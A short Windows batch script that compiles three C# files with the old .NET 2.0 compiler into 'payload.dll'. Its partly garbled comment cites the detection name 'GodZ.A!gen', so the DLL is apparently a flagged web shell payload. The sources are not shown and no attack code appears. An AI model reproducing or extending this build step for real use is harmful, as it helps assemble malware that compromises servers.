@echo off
rem ?? C# ?? payload.dll (GodZ.A!gen ??? 2026-09-09 ??????)
set FX=C:\Windows\Microsoft.NET\Framework\v2.0.50727
"%FX%\csc.exe" /nologo /noconfig /target:library /filealign:512 /optimize+ /out:"%~dp0..\assets\payload.dll" /reference:"%FX%\System.dll" /reference:"%FX%\System.Data.dll" "%~dp0LY.cs" "%~dp0NxTop.cs" "%~dp0NxJob.cs"